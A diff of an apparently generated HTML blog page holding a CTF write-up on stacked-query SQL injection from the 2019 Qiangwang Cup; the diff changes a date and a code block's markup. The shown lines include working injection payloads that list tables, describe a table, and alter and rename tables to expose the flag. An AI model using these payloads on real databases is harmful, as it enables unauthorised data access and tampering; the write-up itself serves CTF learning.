@@ -298,7 +298,7 @@
 	更新于
 	<a href="/2019/06/13/sql注入新姿势-2019强网杯/" itemprop="url">
 		<time datetime="2019-06-13T10:03:06.000Z" itemprop="dateUpdated">
-	  		2019-08-21
+	  		2019-08-22
 	  </time>
 	</a> 	
 
@@ -399,8 +399,9 @@ print my_payload
 <pre class="line-numbers language-html"><code class="language-html">alex';show tables;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>获取本库的所有表。<br><img src="https://s2.ax1x.com/2019/08/21/mtXMqO.png" alt="mtXMqO.png"><br>查看表结构：</p>
-<pre><code>alex&#39;; desc `1919810931114514`;
-</code></pre><p><img src="https://s2.ax1x.com/2019/08/21/mtXTY9.png" alt="mtXTY9.png"></p>
+<pre class="line-numbers language-html"><code class="language-html">alex'; desc `1919810931114514`;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/08/21/mtXTY9.png" alt="mtXTY9.png"></p>
 <p>发现flag<br>我们可以将words表改名为aaa,将flag所在的表改名为word。<br>注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。</p>
 <p>payload：</p>
 <pre class="line-numbers language-html"><code class="language-html">1';alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;#
